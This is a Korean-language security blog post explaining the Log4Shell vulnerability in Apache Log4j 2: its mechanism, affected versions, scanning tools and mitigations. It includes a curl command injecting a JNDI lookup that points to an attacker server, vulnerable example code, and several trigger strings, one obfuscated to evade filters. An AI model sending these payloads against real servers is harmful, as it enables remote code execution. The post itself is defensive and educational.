---
title: "[Log4Shell] Log4j 보안 취약점"
tags: [보안뉴스, log4j, log4shell]
author: eli_ez3r
key: 20211213
modify_date: 2021-12-13
article_header:
  type: cover
  image:
    src:
---


![Log4j Logo](/assets/img/Apache-Log4j-Logo.jpg)



2021년 12월 10일  Log4j보안 취약점에 대한 긴급공지가 발표되었다.

이번 발견된 Log4j취약점 `Log4Shell`은 2021년 11월 24일 Alibaba Cloud 보안팀의 Chen Zhaojun으로부터 발견된 <u>Zero-Day</u>[^1] 취약점으로 12월 9일 트위터에 올라온 게시글로 인해 본격적으로 알려지기 시작했다. 이후 12월 10일 뉴스와 기사에서 발표될 당시에는 이미 취약점 패치를 진행한 후 발표된 <u>One-Day</u>[^2] 취약점인 상태였다.

KISA : [Apache Log4j 2 보안 업데이트 권고](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)

CVE : [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

-----



## Log4j 란?

Log4j는 Apache Software Foundation에서 개발한 인기있는 [로깅 유틸리티 라이브러리](https://en.wikipedia.org/wiki/Log4j)로 Apache 오픈소스이다.

전 세계 수 많은 서비스들이 Log4j를 이용하고 있으며 자바를 처음 배우던 시절 `system.out.println("debug: " + str)`로 디버깅 하던 것 보다 `log.info("debug {}", str)`하라고 조언 받은것 처럼 널리 사용하고 있는 라이브러리이다.

따라서, 자바로 개발한 환경(개발 코드, 사이드 솔루션 등등..)에서 모두 점검해봐야 한다. 일반적으로 자바로 개발된 서버 사이드 솔루션은 다음과 같다.

`Tomcat`, `JBoss`, `Jenkins`, `ElasticSearch`, `Hadoop`, `Kafka`, `Spark`.....



-----

## Log4j 취약점 & 동작원리

취약점은 [Log4j 2.0-beta9](https://issues.apache.org/jira/browse/LOG4J2-313)에서 부터 시작되었다. Lookup 플러그인에 JNDI를 추가하는게 업데이트 목적이였고, 추가된 JNDI를 통해 취약점이 발생하게 되어 현재 알려졌다.

문제가 되는 Log4j 라이브러리는 `log4j-core-<version>jar`이며, Log4j가 로그를 출력할 경우 <u>로그에 사용자ID등이 있을 때</u>[^3] 자동으로 내부에 운영중인 LDAP 서버등에 접속을 해서 변환하는 기능(Lookup 기능)에서 해커의 서버로 접속하여 악성코드를 서버로 다운로드 및 실행되어 서버가 탈취된다.



예를들어 로그를 남길 때 다음과 같이 남긴다고 하면

```java
log.info("Request User Agent: {}", request.getHeader("X-Api-Version"));
```

해커가 악의적으로 HTTP의 Header, X-Api-Version 값에 해커의 주소로 설정한 다음 다음과 같은 요청을 보내면 해커 위와 같은 동작원리로 인해 해커 서버로 요청을 전송하는 방식이다.

```shell
curl [Victim IP:PORT] -H 'X-Api-Version: ${jndi:ldap://[HACKER SERVER]}'
```

서버의 log4j로그를 살펴보면 다음과 같은 로그가 남아 있다. (**...WARN Error looking up JNDI resource [ldap://hacker-server]...**)

```
2021-12-12 07:19:17.375 WARN 1 --- [nio-8080-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : 
Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]
2021-12-12 07:19:34,650 http-nio-8080-exec-2 WARN Error looking up JNDI resource [ldap://hacker-server]. javax.naming.CommunicationException: 
hacker-server:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
```



현재 취약점은 Lookups기능 중에서도 특히 **JDNI**라는 Lookups을 이용해 공격이 가능하다.

Apache Log4j 2의 일부 기능에는 **재귀 분석 기능(Recursive Analysis Functions)**이 있기 때문에 공격자가 직접 악성 요청을 구성하여 **원격 코드 실행 취약점(RCE)**을 유발시킬 수 있어 **CVSS스코어 10점**으로 가장 높은 심각도를 나타내고 있다.

취약점 악용에는 특별한 구성이 필요하지 않으며, Alibaba Cloud 보안팀의 검증결과 Apache Struts2, Apache Solr, Apache Druid, Apache Flink 등이 모두 영향을 받는 것으로 알려있다.



재현 가능한 코드는 다음과 같다. (참조 : https://www.lunasec.io/docs/blog/log4j-zero-day/)

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {
  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
   * This is pseudo-code to explain the vulnerability, and not a full example.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    String apiVersion = he.getRequestHeader("X-Api-Version");

    // This line triggers the RCE by logging the attacker-controlled HTTP header.
    // The attacker can set their X-Api-Version header to: ${jndi:ldap://attacker.com/a}
    log.info("Requested Api Version:{}", apiVersion);

    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```



-----

## JNDI를 이용한 공격

JNDI란 Java Naming and Directory Interface의 약자로 보통 분산시스템에서 다른 리소스를 가져오는데 사용할 수 있다.

다른 리소스의 예로 자바 클래스 등에서 공격자가 이 경로를 자신의 서버로 지정하면 취약점이 있는 서버가 공격자의 서버에서 클래스를 다운받는 것이다.

이렇게 공격자의 서버에서 클래스를 다운받아 코드를 실행하게 된다.



예를들어 다음과 같은 로그 라인이 서버 어플리케이션에 존재한다고 하자.

```java
log.info("Debug: {}", payload);	
```

여기서 payload는 HTTP Requests에서 요청자가 보낸 문자열이다.

이 문자열이 `${jndi:ldap://attacker.com/classname}`을 포함하면 Log4j는 이를 해석하여 `ldap://attacker.com/classname`을 실행시키게 된다.

현재 가장 쉽게 공격할 수 있는 방법은 HTTP 헤더 **User-Agent**에 ldap주소를 넣어 코드를 다운받는 방법이라고 한다.

```
User-Agent : ${jndi:ldap://<host>:<port>/<path>}
```

물론 User-Agent 헤더 뿐만 아니라, HTTP Request에게서 받은 문자열을 로깅하는 경우 어디서든지 지정한 문자열을 로깅하기만 하면 취약점에 노출되어 있다.



-----

## Log4Shell 취약점은 사상 최악의 취약점?

Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 단계의 취약점으로 분류된다.

하지만 그 외에도 아래와 같은 점들 때문에 **사상 최악의 취약점**이라고 불려지고 있다.

1. Log4j는 자바 기반의 소프트웨어에서 굉장히 많이 쓰여지고 있는 라이브러리이다. **=> 공격 대상/범위가 광범위하다.**
2. 공격 방법이 간단하다. **=> 복잡한 과정없이 POC코드를 전송하기만 하면 공격이 성공한다.**
3. 하나의 소프트웨어는 여러개의 소프트웨어가 조합되어 만들어지는데, 그중 한곳에서라도 Log4j를 사용하게 되면, 해당 소프트웨어는 취약하다. **=> Attack Vctor가 다양하다.**
4. 내 서버가 이미 공격을 당했는지 분석하기 위해서는 Log4j를 사용한 시점부터 분석해야 한다. **=> 오랫동안 방치된 취약점으로 피해 범위 파악이 어렵다.**
   - 해당 취약점은 Log4j 2.0-beta9에서 추가된 기능에서 발견되었는데, 이는 약 8년전 업데이트이다.



-----

## 영향 받는 버전

1. Apache Log4j 2
   - 2.0-bete9 ~ 2.14.1 모든 버전
2. Apache Log4j 2를 사용하는 제품
   - [참고사이트](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)를 확인하여 해당 제품을 이용 중일 경우, 해당 제조사의 권고에 따라 패치 또는 대응 방안 적용



-----

## Trigger

공격자가 HTTP Request에 `${jndi:rmi://공격자URL}`, `${jndi:ldap://공격자URL}`, `${jndi:${lower:l}${lower:d}a${lower:p}://공격자URL}` 와 같이 요청 시 트리거된다.



-----



## 점검 방법(1)

[참고 사이트](https://github.com/logpresso/CVE-2021-44228-Scanner)에서 서버 운영체제에 맞게 파일을 다운받는다.

서버내에서 라이브러리가 설치되어 있는 경로를 넣어 점검한다.

- Windows

```
log4j2-scan [--fix] target_path
```

- Linux

```
./log4j2-scan [--fix] target_path
```

- 유닉스(AIX, Solaris ...)

```
java -jar logpresso-log4j2-scan-1.2.0.jar [--fix] target_path
```



- Example (Windows)

```
CMD> log4j2-scan.exe D:\tmp
[*] Found CVE-2021-44228 vulnerability in D:\tmp\elasticsearch-7.16.0\bin\elasticsearch-sql-cli-7.16.0.jar, log4j 2.11.1
[*] Found CVE-2021-44228 vulnerability in D:\tmp\elasticsearch-7.16.0\lib\log4j-core-2.11.1.jar, log4j 2.11.1
[*] Found CVE-2021-44228 vulnerability in D:\tmp\flink-1.14.0\lib\log4j-core-2.14.1.jar, log4j 2.14.1
[*] Found CVE-2021-44228 vulnerability in D:\tmp\logstash-7.16.0\logstash-core\lib\jars\log4j-core-2.14.0.jar, log4j 2.14.0
[*] Found CVE-2021-44228 vulnerability in D:\tmp\logstash-7.16.0\vendor\bundle\jruby\2.5.0\gems\logstash-input-tcp-6.2.1-java\vendor\jar-dependencies\org\logstash\inputs\logstash-input-tcp\6.2.1\logstash-input-tcp-6.2.1.jar, log4j 2.9.1
[*] Found CVE-2021-44228 vulnerability in D:\tmp\solr-7.7.3\solr-7.7.3\contrib\prometheus-exporter\lib\log4j-core-2.11.0.jar, log4j 2.11.0
[*] Found CVE-2021-44228 vulnerability in D:\tmp\solr-7.7.3\solr-7.7.3\server\lib\ext\log4j-core-2.11.0.jar, log4j 2.11.0
[*] Found CVE-2021-44228 vulnerability in D:\tmp\solr-8.11.0\contrib\prometheus-exporter\lib\log4j-core-2.14.1.jar, log4j 2.14.1
[*] Found CVE-2021-44228 vulnerability in D:\tmp\solr-8.11.0\server\lib\ext\log4j-core-2.14.1.jar, log4j 2.14.1

Scanned 5047 directories and 26251 files
Found 9 vulnerable files
Completed in 0.42 seconds
```





## 점검 방법(2)

[Log4j2 BurpSuite 수동 스캐닝 플러그인](https://github.com/whwlsfb/Log4j2Scan)





-----

## 해결방법

1. JDNI 취약점이 해결된 버전으로 패치한다
2. 2.0-beta9 ~ 2.10.0
   - JndiLookup 클래스를 경로에서 제거 : zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
3. 2.10 ~ 2.14.1
   - log4j2.formatMsgNoLookups 또는 LOG4J_FORMAT_MSG_NO_LOOKUPS 환경변수를 true로 설정
4. [제조사 홈페이지](https://logging.apache.org/log4j/2.x/download.html)를 통해 최신버전(2.15.0)으로 업데이트 적용





-----

출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389), [Wiki](https://ko.wikipedia.org/wiki/Log4j), [나무위키](https://namu.wiki/w/Log4j%20%EB%B3%B4%EC%95%88%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%82%AC%ED%83%9C?from=Log4j#Log4j), [popit.kr](https://www.popit.kr/log4j-%EB%B3%B4%EC%95%88-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%8F%99%EC%9E%91%EC%9B%90%EB%A6%AC-%EB%B0%8F-jenkins-%EC%84%9C%EB%B2%84-%ED%99%95%EC%9D%B8-%EB%B0%A9%EB%B2%95/)



[^1]:제로 **데이** 공격(또는 제로 **데이** 위협, Zero-**Day** Attack)은 컴퓨터 소프트웨어의 취약점을 공격하는 기술적 위협으로, 해당 취약점에 대한 패치가 나오지 않은 시점에서 이루어지는 공격을 말한다.
[^2]: 취약점 대응 패치가 배포되고 실제 서버에 적용되기 직전까지에 이루어지는 공격을 말한다.
[^3]: `log.info("Debug: {}", str)`에서 **str**이 **${env:USER}**라면 **USER**가 누군지 찾아서, `Debug: eli_ez3r`라고 문구를 완성하고 해당 문구를 출력하는 경우이다.
